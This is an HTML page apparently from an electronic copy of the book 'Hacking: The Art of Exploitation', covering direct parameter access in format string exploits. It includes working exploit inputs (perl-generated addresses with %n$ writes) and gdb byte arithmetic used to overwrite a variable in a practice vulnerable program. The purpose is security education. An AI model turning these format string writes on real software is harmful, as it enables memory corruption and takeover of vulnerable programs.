<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x355 Direct Parameter Access</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part65.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part67.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark56">0x355 Direct Parameter Access</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Direct parameter access is a way to simplify format string exploits. In the previous exploits, each of the format parameter arguments had to be stepped through sequentially. This necessitated using several <span class="s31">%x </span>format parameters to step through parameter arguments until the beginning of the format string was reached. In addition, the sequential nature required three 4-byte words of junk to properly write a full address to an arbitrary memory location.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 106%;text-align: justify;">As the name would imply, <span class="s27">direct parameter access </span>allows parameters to be accessed directly by using the dollar sign qualifier. For example, <span class="s31">%</span><span class="s33">n</span><span class="s31">$d </span>would access the <span class="s27">n </span>th parameter and display it as a decimal number.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_555.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_556.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">The preceding <span class="s31">printf() </span>call would have the following output:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_557.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">7th: 70, 4th: 00040</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_558.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">First, the <span class="s27">70 </span>is outputted as a decimal number when the format param- eter of <span class="s31">%7$d </span>is encountered, because the seventh parameter is 70. The second format parameter accesses the fourth parameter and uses a field width option of <span class="s31">05</span>. All of the other parameter arguments are untouched. This method of direct access eliminates the need to step through memory until the beginning of the format string is located, since this memory can be accessed directly.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">The following output shows the use of direct parameter access.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_559.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAA%x%x%x%x</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAAbffff3d0b7fe75fc041414141</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">AAAA%4$x</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">AAAA41414141</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_560.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">In this example, the beginning of the format string is located at the fourth parameter argument. Instead of stepping through the first three parameter arguments using <span class="s31">%x </span>format parameters, this memory can be accessed directly. Since this is being done on the command line and the dollar sign is a special character, it must be escaped with a backslash. This just tells the command shell to avoid trying to interpret the dollar sign as a special character. The actual format string can be seen when it is printed correctly.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Direct parameter access also simplifies the writing of memory addresses. Since memory can be accessed directly, there’s no need for four-byte spacers of junk data to increment the byte output count. Each of the <span class="s31">%x </span>format param- eters that usually performs this function can just directly access a piece of memory found before the format string. For practice, let’s use direct param- eter access to write a more realistic-looking address of <span class="s31">0xbffffd72 </span>into the variable <span class="s31">test_val</span>s.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_561.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e &#39;print &quot;\x94\x97\x04\x08&quot; . &quot;\x95\x97\x04\x08&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">. &quot;\x96\x97\x04\x08&quot; . &quot;\x97\x97\x04\x08&quot;&#39;)%4\$n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????%4$n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = 16 0x00000010 reader@hacking:~/booksrc $ gdb -q</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) p 0x72 - 16</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 98</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xfd - 0x72</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$2 = 139</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xff - 0xfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$3 = 2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0x1ff - 0xfd</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$4 = 258</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0xbf - 0xff</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$5 = -64</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) p 0x1bf - 0xff</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$6 = 192</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e &#39;print &quot;\x94\x97\x04\x08&quot; . &quot;\x95\x97\x04\x08&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">. &quot;\x96\x97\x04\x08&quot; . &quot;\x97\x97\x04\x08&quot;&#39;)%98x%4\$n%139x%5\$n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????%98x%4$n%139x%5$n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[*] test_val @ 0x08049794 = 64882 0x0000fd72</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">b7fe75fc</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 9pt;text-align: left;">bffff3c0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e &#39;print &quot;\x94\x97\x04\x08&quot; . &quot;\x95\x97\x04\x08&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">. &quot;\x96\x97\x04\x08&quot; . &quot;\x97\x97\x04\x08&quot;&#39;)%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n The right way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">????????</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 138pt;text-indent: 0pt;text-align: left;">0</p><p class="s31" style="padding-left: 168pt;text-indent: 0pt;text-align: left;">8049794</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">b7fe75fc</p><p class="s31" style="padding-left: 31pt;text-indent: 0pt;text-align: left;">bffff3b0</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -1073742478 0xbffffd72 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_562.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Since the stack doesn’t need to be printed to reach our addresses, the number of bytes written at the first format parameter is 16. Direct parameter access is only used for the <span class="s31">%n </span>parameters, since it really doesn’t matter what values are used for the <span class="s31">%x </span>spacers. This method simplifies the process of writing an address and shrinks the mandatory size of the format string.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part65.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part67.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
